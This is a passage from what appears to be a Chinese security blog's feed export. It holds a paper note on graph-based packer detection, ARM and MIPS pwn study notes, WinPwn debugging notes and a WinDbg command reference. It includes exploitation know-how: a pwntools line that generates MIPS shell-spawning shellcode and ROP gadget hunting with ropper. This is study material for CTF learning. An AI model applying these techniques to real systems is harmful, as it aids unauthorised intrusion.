textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;41&quot; label: &quot;puts&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;42&quot; label: &quot;write&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;43&quot; label: &quot;__stack_chk_fail&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;44&quot; label: &quot;printf&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;45&quot; label: &quot;read&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;46&quot; label: &quot;malloc&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;47&quot; label: &quot;setvbuf&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;48&quot; label: &quot;__cxa_atexit&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;49&quot; label: &quot;__isoc99_scanf&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;50&quot; label: &quot;exit&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;51&quot; label: &quot;__gmon_start__&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;52&quot; label: &quot;__libc_start_main&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;53&quot; label: &quot;__gmon_start__&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>// node 0<br>edge: &#123; sourcename: &quot;0&quot; targetname: &quot;51&quot; &#125;<br>edge: &#123; sourcename: &quot;0&quot; targetname: &quot;53&quot; &#125;<br>// node 1<br>// node 2<br>// node 3<br>// node 4<br>// node 5<br>// node 6<br>// node 7<br>// node 8<br>// node 9<br>// node 10<br>// node 11<br>// node 12<br>// node 13<br>// node 14<br>// node 15<br>// node 16<br>// node 17<br>// node 18<br>// node 19<br>// node 20<br>// node 21<br>// node 22<br>// node 23<br>edge: &#123; sourcename: &quot;23&quot; targetname: &quot;40&quot; &#125;<br>edge: &#123; sourcename: &quot;23&quot; targetname: &quot;52&quot; &#125;<br>// node 24<br>// node 25<br>// node 26<br>// node 27<br>edge: &#123; sourcename: &quot;27&quot; targetname: &quot;25&quot; &#125;<br>// node 28<br>// node 29<br>edge: &#123; sourcename: &quot;29&quot; targetname: &quot;14&quot; &#125;<br>edge: &#123; sourcename: &quot;29&quot; targetname: &quot;17&quot; &#125;<br>// node 30<br>edge: &#123; sourcename: &quot;30&quot; targetname: &quot;16&quot; &#125;<br>edge: &#123; sourcename: &quot;30&quot; targetname: &quot;21&quot; &#125;<br>// node 31<br>edge: &#123; sourcename: &quot;31&quot; targetname: &quot;14&quot; &#125;<br>edge: &#123; sourcename: &quot;31&quot; targetname: &quot;16&quot; &#125;<br>edge: &#123; sourcename: &quot;31&quot; targetname: &quot;17&quot; &#125;<br>edge: &#123; sourcename: &quot;31&quot; targetname: &quot;18&quot; &#125;<br>edge: &#123; sourcename: &quot;31&quot; targetname: &quot;19&quot; &#125;<br>edge: &#123; sourcename: &quot;31&quot; targetname: &quot;21&quot; &#125;<br>// node 32<br>edge: &#123; sourcename: &quot;32&quot; targetname: &quot;13&quot; &#125;<br>edge: &#123; sourcename: &quot;32&quot; targetname: &quot;14&quot; &#125;<br>edge: &#123; sourcename: &quot;32&quot; targetname: &quot;16&quot; &#125;<br>edge: &#123; sourcename: &quot;32&quot; targetname: &quot;17&quot; &#125;<br>edge: &#123; sourcename: &quot;32&quot; targetname: &quot;21&quot; &#125;<br>// node 33<br>edge: &#123; sourcename: &quot;33&quot; targetname: &quot;14&quot; &#125;<br>edge: &#123; sourcename: &quot;33&quot; targetname: &quot;15&quot; &#125;<br>edge: &#123; sourcename: &quot;33&quot; targetname: &quot;16&quot; &#125;<br>edge: &#123; sourcename: &quot;33&quot; targetname: &quot;17&quot; &#125;<br>edge: &#123; sourcename: &quot;33&quot; targetname: &quot;21&quot; &#125;<br>// node 34<br>edge: &#123; sourcename: &quot;34&quot; targetname: &quot;17&quot; &#125;<br>// node 35<br>edge: &#123; sourcename: &quot;35&quot; targetname: &quot;20&quot; &#125;<br>edge: &#123; sourcename: &quot;35&quot; targetname: &quot;37&quot; &#125;<br>// node 36<br>edge: &#123; sourcename: &quot;36&quot; targetname: &quot;14&quot; &#125;<br>edge: &#123; sourcename: &quot;36&quot; targetname: &quot;22&quot; &#125;<br>edge: &#123; sourcename: &quot;36&quot; targetname: &quot;29&quot; &#125;<br>edge: &#123; sourcename: &quot;36&quot; targetname: &quot;30&quot; &#125;<br>edge: &#123; sourcename: &quot;36&quot; targetname: &quot;31&quot; &#125;<br>edge: &#123; sourcename: &quot;36&quot; targetname: &quot;32&quot; &#125;<br>edge: &#123; sourcename: &quot;36&quot; targetname: &quot;33&quot; &#125;<br>edge: &#123; sourcename: &quot;36&quot; targetname: &quot;35&quot; &#125;<br>// node 37<br>// node 38<br>// node 39<br>// node 40<br>// node 41<br>// node 42<br>// node 43<br>// node 44<br>// node 45<br>// node 46<br>// node 47<br>// node 48<br>// node 49<br>// node 50<br>// node 51<br>// node 52<br>// node 53<br>&#125;<br></code></pre></td></tr></table></figure>    </div></div><p>对应的FCG图为：<br><img src="/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/3.png"></p><h2 id="step2-Feature-extraction"><a href="#step2-Feature-extraction" class="headerlink" title="step2. Feature extraction"></a>step2. Feature extraction</h2><p>从FCG中提取19个特征，从文件属性中提取6个特征<br>各特征如下图所示：<br><img src="/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/2.png"></p><h2 id="step3-Packer-detection"><a href="#step3-Packer-detection" class="headerlink" title="step3. Packer detection"></a>step3. Packer detection</h2><p>这一步的目的是判断程序是否加壳，是一个二分类问题<br>程序在加壳后的FCG图会比加壳前简单，可根据这一特征来检测程序是否加壳<br><code>2-SPIFF</code>从FCG图中提取19个特征来构建检测模型</p><div class="note note-success">            <p>如果某种加壳器加壳后的程序的FCG与原程序的FCG一致，该检测方法还有效吗？</p>          </div><h2 id="step4-Packer-identification"><a href="#step4-Packer-identification" class="headerlink" title="step4. Packer identification"></a>step4. Packer identification</h2><p>这一步的目的是识别加壳程序所使用的加壳器，是一个多分类问题<br>程序被不同的加壳器加壳后，FCG大多数会不一样，但也有可能会有FCG相似，但加壳器不同的情况，此时可在FCG特征的基础上加上文件属性特征，将两种特征融合起来去识别不同的加壳器<br><code>2-SPIFF</code>将19个图特征和6个文件特征级联起来构建识别模型，使用 <em><strong>class prob</strong></em> 和一个阈值 $\tau$ 来识别某加壳文件的加壳器，<em><strong>class prob</strong></em> 是一个数组，每一项代表某个加壳器的概率，如果最大的 <em><strong>class prob$_{i}$</strong></em> 小于 $\tau$ ，则该项的识别结果为“未知”</p><h1 id="0x03-Inovation"><a href="#0x03-Inovation" class="headerlink" title="0x03. Inovation"></a>0x03. Inovation</h1><ul><li>发现了程序加壳前后FCG的不同之处，加壳后的程序FCG往往会更加简单</li><li>不同加壳器可能生成相同的FCG，但不同加壳器使用不同的算法，这导致被不同加壳器加壳后的程序在文件属性中必有差异</li><li>结合以上两个特征，提出了一种两段式的加壳器检测方法，第一阶段根据FCG特征构建模型检测是否加壳，第二阶段根据FCG特征和文件属性特征构建模型来检测使用了什么加壳器</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>论文阅读</category>
      
      <category>恶意软件检测</category>
      
    </categories>
    
    
    <tags>
      
      <tag>论文阅读</tag>
      
      <tag>壳检测</tag>
      
      <tag>恶意软件检测</tag>
      
      <tag>malware detection</tag>
      
      <tag>paker detection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arm pwn 笔记</title>
    <link href="/2024/04/17/arm-pwn-%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/04/17/arm-pwn-%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h2 id="arm软件包"><a href="#arm软件包" class="headerlink" title="arm软件包"></a>arm软件包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs BASH">sudo apt search <span class="hljs-string">&quot;libc6-&quot;</span> | grep <span class="hljs-string">&quot;arm&quot;</span><br>sudo apt install libc6-arm64-cross<br></code></pre></td></tr></table></figure><p>安装好的库&#x2F;usr&#x2F;aarch64-linux-gnu&#x2F;lib&#x2F;目录下</p><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><h2 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h2><ul><li><p>X29寄存器作用相当于x64的rbp，X30寄存器用于保存返回地址，当执行RET指令时，会将X30的值赋值给PC寄存器。PC寄存器即x64的rsp。</p></li><li><p>b指令跳转到某个标签处，单纯的jmp</p></li><li><p>BL指令用于跳转，并且会将返回地址保存在X30寄存器中。然后函数开头一般就会将这两个寄存器的值保存到栈里。</p></li><li><p>LDP X29, X30, [SP+var_s0],#0x10;RET 指令，相当于x64的pop rbp; ret。</p></li></ul><h2 id="内存读取指令"><a href="#内存读取指令" class="headerlink" title="内存读取指令"></a>内存读取指令</h2><ul><li><p>str register,addr指令，st即store的缩写,将register寄存器里的值写入到addr地址处。</p></li><li><p>ldr register,addr指令，ld即load dword的缩写,读取addr处的数据，放入register寄存器。</p></li><li><p>LDP register1, register2,addr ，从addr读取两个dword，分别存入register1、register2。</p></li><li><p>STP register1, register2,addr ，将register1、register2的值依次存入addr处。</p></li></ul><h2 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h2><ul><li><p>ADRP  X0, #label@PAGE指令，将label所处的页的基地址存入X0。</p></li><li><p>ADD   X0, X0, #label@PAGEOFF指令，偏移加上基地址，得到label的地址。</p></li></ul><h1 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h1><h2 id="传参方式"><a href="#传参方式" class="headerlink" title="传参方式"></a>传参方式</h2><p>用$R0~$R3传递函数的前4个参数，其余参数从右到左入栈</p><h2 id="相似处"><a href="#相似处" class="headerlink" title="相似处"></a>相似处</h2><ul><li>R13 相当于栈指针ESP&#x2F;RSP</li><li>PC 相当于EIP&#x2F;RIP指针</li><li>LR link register 保存返回地址的寄存器</li><li>BL 相当于call ， 跳转并把返回值保存到LR中</li><li>B 相当于jmp</li><li>BX 跳转并切换状态 ARM 与THUMB 指令</li><li>BLX 带返回的跳转并切换状态</li></ul><h2 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h2><p>返回值存放在r0</p><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p><img src="/2024/04/17/arm-pwn-%E7%AC%94%E8%AE%B0/1.png"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>arm pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mips pwn 笔记</title>
    <link href="/2024/04/17/mips-pwn-%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/04/17/mips-pwn-%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h2 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs BASH">sudo apt install --install-suggests qemu<br></code></pre></td></tr></table></figure><h2 id="gdb-multiarch"><a href="#gdb-multiarch" class="headerlink" title="gdb-multiarch"></a>gdb-multiarch</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs BASH">sudo apt-get install gdb-multiarch<br></code></pre></td></tr></table></figure><h2 id="mips软件包"><a href="#mips软件包" class="headerlink" title="mips软件包"></a>mips软件包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs BASH">&lt;!-- 具备MIPS交叉编译gcc与MIPS程序动态链接库 --&gt;<br>sudo apt-get install gcc-mips-linux-gnu<br>sudo apt-get install gcc-mipsel-linux-gnu<br>sudo apt-get install gcc-mips64-linux-gnuabi64<br>sudo apt-get install gcc-mips64el-linux-gnuabi64<br></code></pre></td></tr></table></figure><h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-mipsel -g 9000 -L ./mips mips<br></code></pre></td></tr></table></figure><p><font size=5 color=red>or</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">io = process([<span class="hljs-string">&quot;qemu-mipsel&quot;</span>,<span class="hljs-string">&quot;-g&quot;</span>,<span class="hljs-string">&quot;9000&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;./mips&quot;</span>,<span class="hljs-string">&quot;mips&quot;</span>])<br></code></pre></td></tr></table></figure><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb-multiarch -q mips<br></code></pre></td></tr></table></figure><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gdb">set architecture mips<br>set endian big<br>target remote :9000<br></code></pre></td></tr></table></figure><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">asm(shellcraft.mips.linux.sh())<br></code></pre></td></tr></table></figure><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><h2 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h2><ul><li><p>j指令跳转到某个标签处，单纯的jmp</p></li><li><p>jr指令用于跳转到寄存器里的地址值指向的地方。</p></li><li><p>jal 跳转时，会将返回地址存入$ra寄存器。</p></li><li><p>jalr 与jal指令类似，只不过后面的对象为寄存器。</p></li><li><p>$ra寄存器，ra为，return address的缩写，一般用于存储返回地址，一个函数结尾往往会从栈里弹出一个值赋值给$ra寄存器，然后jr $ra。</p></li></ul><h2 id="内存读取指令"><a href="#内存读取指令" class="headerlink" title="内存读取指令"></a>内存读取指令</h2><ul><li><p>sw register,addr指令，sw即store word的缩写（对应的有store byte）,将register寄存器里的值写入到addr地址处。</p></li><li><p>lw register,addr指令，lw即load word的缩写（对应的有load byte）,读取addr处的数据，放入register寄存器。</p></li></ul><h2 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h2><ul><li><p>la指令，相当于x86的lea</p></li><li><p>lai指令，i的意思是immediate立即数，即后面的对象为立即数。</p></li><li><p>la $a0,1($s0)指令，带有偏移的寻址，它的作用是$a0 &#x3D; 1 + $s0</p></li></ul><h1 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h1><h2 id="传参方式"><a href="#传参方式" class="headerlink" title="传参方式"></a>传参方式</h2><p>用$a0~$a3传递函数的前4个参数，记忆方法，寄存器名字a实际为argument的缩写。多余的参数用栈传递</p><h2 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h2><p>一般用$v0~$v1寄存器传递。v也就是value的缩写。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>mips pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WinPwn 笔记</title>
    <link href="/2024/04/11/WinPwn-%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/04/11/WinPwn-%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>win_server监听某个程序，虚拟机中remote连接，raw_input()等待windbg attach之后再发送数据。</p><h2 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h2><p>bp [exe_name]+offset:断在offset处<br>bp pe_base+offset:断在offset处<br>lm:查看加载的dll及pe地址空间<br>u addr:查看addr处的代码<br>g:运行到断点<br>p:单步步过<br>t:单步步入<br>!address [target_addr]:查看target_addr所属的地址范围<br>dps [addr]:查看addr处开始的一段范围内的值，并且搜索出二进制对应的符号<br>s -d 0x0 l?0x7fffffff 0x12345678 全局搜索0x12345678</p><h2 id="寻找gadget"><a href="#寻找gadget" class="headerlink" title="寻找gadget:"></a>寻找gadget:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ropper --file ./ntdll.dll --nocolor &gt; gadget<br></code></pre></td></tr></table></figure><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><ul><li>GS:类似canary</li><li>ASLR:地址随机化，但是只有开机的时候才会随机一次</li></ul><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>scopeTable结构体中保存了try块相匹配的except,__finally的值，在main函数开始的入口就被压入到栈中。</p><p>在遇到异常时，先执行except_handler4函数，该函数首先将scope_table的地址同security_cookie异或得到实际地址，之后验证gs的值，满足要求后当try_level&#x3D;0xfffffffe(-2)时，调用scope_table中的filter_func。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>WinPwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ToDo</title>
    <link href="/2024/04/11/ToDo/"/>
    <url>/2024/04/11/ToDo/</url>
    
    <content type="html"><![CDATA[<h1 id="虚拟机逃逸"><a href="#虚拟机逃逸" class="headerlink" title="虚拟机逃逸"></a>虚拟机逃逸</h1><h1 id="Lua-Pwn"><a href="#Lua-Pwn" class="headerlink" title="Lua Pwn"></a>Lua Pwn</h1><h1 id="Php-Pwn"><a href="#Php-Pwn" class="headerlink" title="Php Pwn"></a>Php Pwn</h1><h1 id="Musl-Pwn"><a href="#Musl-Pwn" class="headerlink" title="Musl Pwn"></a>Musl Pwn</h1><h1 id="Kernel-Pwn"><a href="#Kernel-Pwn" class="headerlink" title="Kernel Pwn"></a>Kernel Pwn</h1><h1 id="LLVM-Pwn"><a href="#LLVM-Pwn" class="headerlink" title="LLVM Pwn"></a>LLVM Pwn</h1><h1 id="V8"><a href="#V8" class="headerlink" title="V8"></a>V8</h1><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>WinDbg 笔记</title>
    <link href="/2024/04/11/WinDbg-%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/04/11/WinDbg-%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h1><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.sympath</span>   <span class="hljs-string">//</span> 查看当前符号查找路径<br><span class="hljs-string">.sympath</span> c:\symbols   <span class="hljs-string">//</span> 将符号查找路径设为：c:\symbols<br><span class="hljs-string">.sympath</span>+ c:\symbols  <span class="hljs-string">//</span> 将c:\symbols添加到符号查找路径集合中<br><br><span class="hljs-string">.reload</span> <span class="hljs-string">//</span> 为所有已加载模块载入符号信息<br><span class="hljs-string">.reload</span> <span class="hljs-string">/f</span> <span class="hljs-string">/v</span> <span class="hljs-string">//</span> f:强制立即模式（不允许延迟载入）  v:详细模式<br><span class="hljs-string">.reload</span> <span class="hljs-string">/f</span> @<span class="hljs-string">&quot;c:\windows\System32\verifier.dll&quot;</span> <span class="hljs-string">//</span> 为指定模块加载符号信息<br></code></pre></td></tr></table></figure><h1 id="系统模块与PE文件检索："><a href="#系统模块与PE文件检索：" class="headerlink" title="系统模块与PE文件检索："></a>系统模块与PE文件检索：</h1><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">0<span class="hljs-function">:000</span>&gt; lm            <span class="hljs-string">//</span> 列出所有模块对应的符号信息<br>0<span class="hljs-function">:000</span>&gt; lmv           <span class="hljs-string">//</span> 列出所有模块对应的符号信息<br>0<span class="hljs-function">:000</span>&gt; lmt           <span class="hljs-string">//</span> 列出所有模块的基地址和偏移<br>0<span class="hljs-function">:000</span>&gt; lmf           <span class="hljs-string">//</span> 列出所有DLL的具体路径<br>0<span class="hljs-function">:000</span>&gt; lmvm ntdll    <span class="hljs-string">//</span> 查看ntdll.dll的详细信息<br>0<span class="hljs-function">:000</span>&gt; !lmi ntdll    <span class="hljs-string">//</span> 查看ntdll.dll的详细信息<br><br>0<span class="hljs-function">:000</span>&gt; !dlls -a               <span class="hljs-string">//</span> 列出镜像文件PE结构的文件头<br>0<span class="hljs-function">:000</span>&gt; !dlls -l               <span class="hljs-string">//</span> 按照顺序列出所有加载的模块<br>0<span class="hljs-function">:000</span>&gt; !dlls -c ntCreateFile  <span class="hljs-string">//</span> 查询指定函数所在的模块<br>0<span class="hljs-function">:000</span>&gt; !dlls -c ntdll.dll     <span class="hljs-string">//</span> 列出特定模块头信息<br>0<span class="hljs-function">:000</span>&gt; !dlls -s -c ntdll.dll  <span class="hljs-string">//</span> 列出ntdll.dll的节区<br>0<span class="hljs-function">:000</span>&gt; !dlls -v -c ntdll      <span class="hljs-string">//</span> 查看ntdll.dll的详细信息<br><br>0<span class="hljs-function">:000</span>&gt; ld *         <span class="hljs-string">//</span> 为所有模块加载符号<br>0<span class="hljs-function">:000</span>&gt; ld kernel32 <span class="hljs-string">//</span> 加载kernel32.dll的符号<br>0<span class="hljs-function">:000</span>&gt; x*!                    <span class="hljs-string">//</span> 列出加载的所有符号信息<br>0<span class="hljs-function">:000</span>&gt; x ntdll!*              <span class="hljs-string">//</span> 列出ntdll.dll中的所有符号<br>0<span class="hljs-function">:000</span>&gt; x ntdll!nt*            <span class="hljs-string">//</span> 列出ntdll.dll模块中所有nt开头的符号<br>0<span class="hljs-function">:000</span>&gt; x <span class="hljs-string">/t</span> <span class="hljs-string">/v</span> ntdll!*        <span class="hljs-string">//</span> 带数据类型、符号类型和大小信息列出符号<br>0<span class="hljs-function">:000</span>&gt; x kernel32!*Load*      <span class="hljs-string">//</span> 列出kernel32模块中所有含Load字样的符号<br></code></pre></td></tr></table></figure><h1 id="进程与线程操作"><a href="#进程与线程操作" class="headerlink" title="进程与线程操作"></a>进程与线程操作</h1><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">| <span class="hljs-string">//</span> 列出调试进程<br>!dml_proc             <span class="hljs-string">//</span> 显示当前进程信息<br><span class="hljs-string">.tlist</span> -v             <span class="hljs-string">//</span> 列出所有运行中的进程<br>~   <span class="hljs-string">//</span> 列出线程<br>~.  <span class="hljs-string">//</span> 查看当前线程<br>~*  <span class="hljs-string">//</span> 所有线程<br>~0s <span class="hljs-string">//</span> 查看主线程<br>~* k <span class="hljs-string">//</span> 所有线程堆栈信息<br>~* r <span class="hljs-string">//</span> 所有线程寄存器信息<br>~<span class="hljs-comment"># // 查看导致当前事件或异常的线程</span><br>~N  <span class="hljs-string">//</span> 查看序数为N的线程<br>~~[n]  <span class="hljs-string">//</span> 查看线程ID为n的线程  n为16进制<br>~Ns   <span class="hljs-string">//</span> 切换序数为N的线程为当前调试线程<br>~~[n]s  <span class="hljs-string">//</span> 切换线程ID为n的线程为当前调试线程  n为16进制<br>~3f      <span class="hljs-string">//</span>把三号线程冻住<br>~2u       <span class="hljs-string">//</span>把二号线程解冻<br><br>~N n  <span class="hljs-string">//</span> Suspend序数为N的线程<br>~N m <span class="hljs-string">//</span> Resume序数为N的线程<br>!runaway  <span class="hljs-string">//</span>显示当前进程的所有线程用户态时间信息<br>!runaway f  <span class="hljs-string">//</span>显示当前进程的所有线程用户态、内核态、存活时间信息<br>!locks <span class="hljs-string">//</span> 显示死锁<br>!cs  <span class="hljs-string">//</span> 列出CriticalSection（临界段）的详细信息<br><br>0<span class="hljs-function">:000</span>&gt; <span class="hljs-string">.formats</span> 1d78  <span class="hljs-string">//</span> 格式化输出PID<br>!handle  <span class="hljs-string">//</span> 查看所有句柄的ID<br></code></pre></td></tr></table></figure><h1 id="反汇编指令与内存断点"><a href="#反汇编指令与内存断点" class="headerlink" title="反汇编指令与内存断点"></a>反汇编指令与内存断点</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs armasm">u   <span class="hljs-comment">// 反汇编当前eip寄存器地址的后8条指令</span><br><span class="hljs-symbol">ub</span>  <span class="hljs-comment">// 反汇编当前eip寄存器地址的前8条指令</span><br>u main.exe+<span class="hljs-number">0x10</span> L20 <span class="hljs-comment">// 反汇编main.exe+0x10地址后20条指令</span><br><span class="hljs-symbol">uf</span> lyshark::<span class="hljs-keyword">add</span>  <span class="hljs-comment">// 反汇编lyshark类的add函数</span><br><span class="hljs-symbol">uf</span> /c main  <span class="hljs-comment">// 反汇编main函数</span><br><span class="hljs-symbol">ub</span> <span class="hljs-number">000</span>c135d L20  <span class="hljs-comment">// 查看地址为000c135d指令前的20条指令内容</span><br><br>r <span class="hljs-comment">// 显示所有寄存器信息及发生core所在的指令</span><br>r eax, edx <span class="hljs-comment">// 显示eax，edx寄存器信息</span><br>r eax<span class="hljs-number">=5</span>, edx<span class="hljs-number">=6</span>  <span class="hljs-comment">// 对寄存器eax赋值为5，edx赋值为6</span><br><br>g  <span class="hljs-comment">// Go 让程序跑起来</span><br>p    <span class="hljs-comment">// 单步执行(F10)</span><br>p <span class="hljs-number">2</span> <span class="hljs-comment">// 2为步进数目</span><br><span class="hljs-symbol">pc</span>   <span class="hljs-comment">// 执行到下一个函数调用处停下</span><br><span class="hljs-symbol">pa</span> <span class="hljs-number">0x7c801b0b</span> <span class="hljs-comment">// 执行到7c801b0b地址处停下</span><br>t     <span class="hljs-comment">// 停止执行</span><br><br>!address -summary  <span class="hljs-comment">// 显示进程的内存统计信息</span><br>!address -f:stack  <span class="hljs-comment">// 查看栈的内存信息</span><br>!address <span class="hljs-number">0x77c000</span>   <span class="hljs-comment">// 查看该地址处的内存属性</span><br><br><span 